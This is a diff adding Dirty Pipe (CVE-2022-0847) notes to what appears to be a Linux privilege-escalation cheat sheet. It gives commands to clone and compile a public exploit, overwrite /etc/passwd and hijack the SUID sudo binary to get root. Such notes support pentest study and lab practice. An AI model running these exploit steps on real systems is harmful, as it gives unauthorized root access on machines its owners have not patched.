@@ -2391,3 +2391,52 @@ gcc cve-2021-4034-poc.c -o poc
 ```
 
 ---
+
+#  Dirty Pipe 
+
+## 📌 Overview
+- A Linux kernel vulnerability (versions 5.8–5.17) allowing unauthorized write access to read-only files.
+- Similar to Dirty Cow (2016).
+- Affects Android devices too—malicious apps can gain root access.
+
+
+## 🔧 How It Works
+- Exploits Unix pipes to overwrite file contents.
+- Can modify sensitive files like `/etc/passwd` to bypass root password prompts.
+
+## 🛠️ Exploitation Steps
+
+### 1. Download & Compile Exploit
+```bash
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+cd CVE-2022-0847-DirtyPipe-Exploits
+bash compile.sh
+```
+
+### 2. Check Kernel Version
+```bash
+uname -r
+# Example: 5.13.0-46-generic
+```
+
+### 3. Run Exploit-1 (Modify /etc/passwd)
+```bash
+./exploit-1
+# id → uid=0(root)
+```
+
+
+## 🔍 SUID Binary Hijack (Exploit-2)
+
+### Find SUID Binaries
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+### Run Exploit
+```bash
+./exploit-2 /usr/bin/sudo
+# id → uid=0(root)
+```
+
+---
